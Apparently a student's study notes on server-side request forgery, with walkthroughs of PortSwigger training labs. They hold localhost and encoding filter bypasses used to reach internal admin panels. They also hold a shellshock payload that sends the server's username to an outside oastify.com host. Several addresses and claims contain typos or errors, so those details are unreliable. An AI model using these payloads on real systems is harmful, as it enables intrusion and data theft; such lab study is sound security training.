# 17. Server Side Request Forgery

## Server-Side Request Forgery

* An attacker tricks a web application into making requests to internal servers or external servers and exploit that server
* An attacker tricks the web application without validation the user supplied input this allow the attacker to cause the server into making network connection on behalf on attacker

### Types of SSRF

#### Regular/In band

* Attackers trick the URL, and the request URL is display back to as a response.

#### Blind / out of band

* Attackers trick the URL, and the request is successfully executed, however the response doesn’t response back. To get the response used the DNS or http request to an attacker control server and if get request means its vulnerable.

### Impact

* leads to sensitive information disclosing, scanning of internal network, compromise the internal service, remote code execution etc.

### Identifying

* Map the application >> visit every page, walk through every page, make notes of all the input that talk to backend, understand how the application functions, understand the logic and business of the application.
* For request parameter modify the value and fuzz the parameter and see how the application response
* If a defense is in place attempt to using know techniques.
* For request parameter, modify the value to a server on the internet that attacker controls and monitor the server incoming request.

### Types

#### In-band SSRF

* When testing for in-band SSRF if the web application allows user-supplied malicious URLs, Check whether port numbers can be accessed. If the application permits port scanning, then use Burp Intruder to scan for opens ports and attempts to connect to other services, such as using the loopback address (127.0.0.1 or localhost).
* In Cases where the web application does not allow user-supplied URLs, different encoding methods might bypass blacklists
  * For example: The decimal encoded version of 127.0.0.1 is 2130706433, and 127.1 also resolves to 127.0.0.1. An octal representation can be used, like 01770000001 for 127.0.0.1.
* Another method is DNS rebinding, where a domain name is registered to resolve to an internal IP address. In DNS rebinding, an initial request resolves to an external IP, and the application allows it. However, subsequent requests resolve to an internal IP (e.g., 127.0.0.1), bypassing internal IP restrictions.
* Alternatively, a server under your control can redirect requests to an internal IP address via HTTP redirection.

#### Blind SSRF

* Blind SSRF occurs when the application does not display the response from the SSRF request.
* In such cases, attempt to trigger an HTTP request to an external server you control. If the server logs a request, the application is vulnerable. If no response is observed, additional testing may be required to confirm. Burp Suite’s Collaborator Everywhere extension can be used for detection.

### Prevention

* Defense in Depth Approach: Implement multiple layers of security controls to protect against attacks. These include application layer defenses and network layer defenses, such as firewalls and monitoring tools.
* Application Layer Defenses: Ensure proper input validation and sanitization on both client-side and server-side. Implement strict access controls and monitor for abnormal activity.
* Network Layer Defenses (Firewall): Configure firewalls to block unauthorized outgoing requests and segment the network to limit access to internal services.
* Sanitize and Validate Input: Always sanitize and validate data both at the client and server levels to prevent injection attacks. Avoid relying solely on client-side validation, as it can be bypassed by attackers.
* Use Allow Lists: Implement allow lists for URLs, ports, and destinations to limit where requests can be made. Avoid blacklists, as they can be bypassed by clever attackers.
* Limit HTTP Redirections: Disable or limit unnecessary HTTP redirections, especially when they involve external domains, to prevent Server-Side Request Forgery (SSRF) attacks.

### Testing

* You attempted to delete the username carlos by using the following URL: /admin/delete?username=carlos
* While testing, you identified an IP address range from 192.168.0.1 to 192.168.0.255. By using Burp Intruder, you found that 192.168.0.201 returned a 404 Not Found error.
* then used the URL: http://192.168.0.201/admin/delete?username=carlos to attempt the deletion.
* There was a blacklist in place, but it was bypassed by using a double URL encoding trick: 127.1/%25%36%31dmin/delete?username=carlos
* In this case, "admin" was encoded, allowing you to bypass the block and delete the user carlos.
* The application only allowed requests from specific stakeholders. You attempted to bypass this by adding a modified parameter: username@stackhold, which was accepted and returned different results.
* You then tried: username#@stackhold/admin
* Here, the hash (#) was double URL encoded. The application parsed username as the parameter, and /admin was interpreted as a directory, bypassing the restrictions.
* During this process, using Burp Collaborator, you found an Out-Of-Band (OOB) Server-Side Request Forgery (SSRF) vulnerability within the User-Agent header. To further exploit this vulnerability, you injected a shellshock payload:

```
() { :;}; /usr/bin/nslookup $(whoami).5w2o34fecrsrt5l2ygkcy840trzin8bx.oastify.com
```

* This payload forced the server to execute the nslookup command, revealing the server’s username via an out-of-band DNS request to the provided oastify.com domain

## SSRF PortSwigger Labs

### Basic SSRF against the local server

* Home Page
* HTTP History
* Browsing Items
* HTTP History: Browsing through HTTP history, no specific endpoint or API was initially identified.
* Item Stock Check Feature: Discovered a feature that checks the stock of an item.
* The backend packet contains: stockapi=http://internalwebsitedatabase.

Send to Repeater:

* The URL encoding was decoded to reveal: http://stock.welikeshop.net:8080/product/stock/check?productId=1\&storeId=1
* Discovering Localhost: While probing, an admin panel became visible on the localhost.
* Found Admin Directory: Located the admin directory at /admin.
  * Stockapi:http://1270.0.1/

Stcokapi=http://127.0.01/admin

* Found User Deletion Functionality: In the /admin directory, a link for deleting user carlos was found: /admin/delete?username=carlos
* HTTP Response: The deletion request resulted in a 302 Redirect response.
* LAB Solved

### Basic SSRF against another back-end system

* LAB
* Home Page
* HTTP History: Browsing through HTTP history, no specific endpoint or API was initially identified.
* Item Stock Check Feature: Discovered a feature that checks the stock of an item
* Backend packets
* The backend packet contains: stockapi=http://internalwebsitedatabase
* Backend packet of /product/stock.
* Send to Reapter
* The URL encoding was decoded to reveal
* Discovering Localhost: While probing, an admin panel became visible on the localhost
* The lab description indicated that the admin panel could be located at http://192.168.0.X:8080 or https://192.168.0.1:8080/admin."
* "When attempting to access the admin panel at http://192.168.0.2:8080/admin, the response returned 'missing parameters.'"
* A 404 error typically means "Not Found," not "Unauthorized." It should read, "The http://192.168.0.201 endpoint returned a 404 response, indicating the resource was not found."
* Got the internal server error in http://192.168.0.2:8080/admin
* In the web base.
* Send it to Intruder
* Intruder Payload
* Intruder Results
* The http://192.168.0.201 has the 404 response means unauthorized.
* Found Admin Directory: Located the admin directory at /admin. http://192.168.0.201/admin
* Found User Deletion Functionality: In the /admin directory, a link for deleting user carlos was found: http://192.168.0.201:8080/admin/delete?username=carlos
* HTTP Response: The deletion request resulted in a 302 Redirect response.
* Lab Solved

### SSRF with blacklist-based input filter

* Home page
* HTTP History: Browsing through HTTP history, no specific endpoint or API was initially identified.
* Bowering the item.
* HTTP Browsing
* Browsing the item.
* The backend packet contains: stockapi=http://internalwebsitedatabase.
* Sending to Reapeter
* The URL encoding was decoded to reveal:http://stock.welikeshop.net:8080/product/stock/check?productId=1\&storeId=1
* Discovering Localhost: While probing, an admin panel.
* While probing, an admin panel was discovered at http://127.0.0.1/, but the response indicated 'External stock check blocked for security reasons.'"
* Attempted to bypass the security block by using the short form http://127.1/."
* Found Admin Directory: Located the admin directory at /admin.
* /admin is blocked response ‘External stock check blocked for security reason’
* The /admin path was URL encoded to attempt bypassing the filter: http://127.1/%25%36%31dmin/
* Double URL encoding was used to bypass the filter: http://127.1/%25%36%31dmin/." http://127.1/%&1dmin/ >> http://127.1/%25%36%31dmin/
* Found User Deletion Functionality:
* Located a user deletion functionality within the /admin directory: /%25%36%31dmin/delete?username=carlos."
* HTTP Response: The deletion request resulted in a 302 Redirect response.
* Following the redirection resulted in a 404 error, indicating unauthorized access."
* Solved

### SSRF with whitelist-based input filter

* Home Page
* HTTP History: Browsing through HTTP history, no specific endpoint or API was initially identified.
* Navigating to Items

Backend Packets.

Item Stock Check Feature: Discovered a feature that checks the stock of an item.

* The backend packet contains: stockapi=http://internalwebsitedatabase.
* Sent the request to Repeater for further investigation.
* The URL encoding was decoded to reveal: http://stock.welikeshop.net:8080/product/stock/check?productId=1\&storeId=1
* The request parameter contained: stockapi=http://internalwebsitedatabase."
* Discovering Localhost: While probing, an admin panel became visible on the localhost. : http://stock.weliketoshop.net:8080/ its response with Missing parameter.
* Attempted to add a valid parameter to bypass the required stock.weliketoshop check, which is necessary for querying stock."
* Added a parse and a comment (#) to the required string in an attempt to bypass the check." Username@stock.weliketoshop.net
* It responded with a 'Missing parameter' error again."
* After adding # in username@#stock.weliketoshop.net
* The response error changed External stock check has stock.weliketoshop.net
* After URL encoding the hash symbol (#), the response remained the same."
* Double URL encoding the hash response error in 500 internal server error
* The 'Could not connect to external stock check service' error indicates that the stock.weliketoshop.net string was successfully commented out. However, the web application still requires this string in the request, which leads to an error when it cannot find the username or the required stock.weliketoshop.net string."
* Changed the username to localhost, which bypassed the check and revealed the admin directory."
* Found Admin Directory: Located the admin directory at /admin.
* Found User Deletion Functionality: In the /admin directory, a link for deleting user carlos was found:

```
/admin/delete?username=carlos
```

* HTTP Response: The deletion request resulted in a 302 Redirect response.
* Following the redirection results in a 404 Unauthorized error."
* Lab Solved
* Lab Solved

### SSRF with filter bypass via open redirection vulnerability

* Home Page
* HTTP History: Browsing through HTTP history, no specific endpoint or API was initially identified.
* Item Stock Check Feature: Discovered a feature that checks the stock of an item.
* The backend request parameter contained stockapi=http://internalwebsitedatabase."
* Sent the request to Repeater for further analysis."
* The request is /product/nextproductId=1\&path=/product?productId=2."
* Analyzed the 'Check product' and 'Next product' requests in Repeater."
* The 'Check stock' request returned a normal response."
* Normal response checkstock
* The URL encoding was decoded to reveal: http://product/stock/check?productId=1\&stockId=1
* Check product to http://localhost/ Its response with Not Found.
* The request to http://127.0.0.1/ responded with 'Internal External stock check URL: Invalid URL'
* The system requested an internal directory and product details."
* In the next product query the open redirection work
* Discovering Localhost: While probing, an admin panel became visible on the localhost.
* Added the open redirection from 'Next product' into the 'Check stock' API as stockapi=/product/nextproduct?currentproductId=1\&path=127.0.0.1."
* It response missing parameter path
* URL encoding the path parameter successfully bypassed the filter."
* Using the bypass technique, the admin directory was located at /admin.
* In the lab its says the admin panel is in http://192.168.0.12:8080/admin
* The admin directory contained a link for deleting the user 'carlos' using /admin/delete?username=carlos

Deleted

Solved

### Blind SSRF with out-of-band detection

* Home Page
* HTTP History: Browsing through HTTP history, no specific endpoint or API was initially identified.
* Examining the request for the selected item.
* Backend request
* Send to Repeater:
* The request returned a normal response without any errors."
* There is a 'Referer' header that the web application uses to fetch the product details
* Used Burp Collaborator to test for potential Out-of-Band SSRF vulnerability by injecting a Collaborator-generated URL into the 'Referer' header."
* Injected the Collaborator link into the 'Referer' header."
* Pulling from collabirator
* No interaction was detected, indicating that the initial test did not trigger any out-of-band SSRF.
* Added the 'http://collaborator-string' into the request."
* Checked the Burp Collaborator client for any interactions."
* The messages became visible, indicating that the server resolved both DNS and HTTP requests."
* The lab was successfully completed by exploiting the Out-of-Band SSRF vulnerability using a Collaborator payload."

### Blind SSRF with shellshock

* This example demonstrates the impact of an Out-of-Band SSRF attack."
* Home Page
* Reviewing the HTTP history helped determine that no specific SSRF-related endpoint or API was initially apparent."
* Navigating to the Items page to identify potential SSRF vulnerabilities."
* A Burp extension called Collaborator Everywhere is used to detect Out-of-Band SSRF vulnerabilities.
* Installed the Collaborator Everywhere extension."
* It showed that the User-Agent header is vulnerable to Out-of-Band SSRF.
* Added the Collaborator link to the User-Agent header to validate the vulnerability."
* Checked the Collaborator client but initially received no interaction.
* Used a Shellshock payload to test for command injection through the User-Agent header.
* Yes, it was vulnerable.
* The impact was Remote Code Execution (RCE), confirmed by retrieving the username 'peter-fUbZv'."
* Submitted the solution and successfully completed the lab."
